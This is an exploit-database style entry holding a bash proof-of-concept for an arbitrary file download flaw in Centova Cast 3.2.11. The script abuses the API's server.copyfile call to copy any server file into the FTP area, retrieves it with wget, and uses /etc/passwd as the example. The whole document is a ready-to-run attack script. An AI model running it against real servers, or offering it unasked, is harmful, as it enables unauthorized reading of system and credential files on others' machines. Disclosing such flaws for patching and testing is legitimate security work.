# Exploit Title: Centova Cast 3.2.11 - Arbitrary File Download
# Date: 2019-11-17
# Exploit Author: DroidU
# Vendor Homepage: https://centova.com
# Affected Version: <=v3.2.11
# Tested on: Debian 9, CentOS 7

#!/bin/bash
if [ "$4" = "" ]
then
echo "Usage: $0 centovacast_url user password ftpaddress"
exit
fi
url=$1
user=$2
pass=$3
ftpaddress=$4

dwn() {
curl -s -k "$url/api.php?xm=server.copyfile&f=json&a\[username\]=$user&a\[password\]=$pass&a\[sourcefile\]=$1&a\[destfile\]=1.tmp"
wget -q "ftp://$user:$pass@$ftpaddress/1.tmp" -O $2
}

dwn /etc/passwd passwd
echo "

/etc/passwd:
"
cat passwd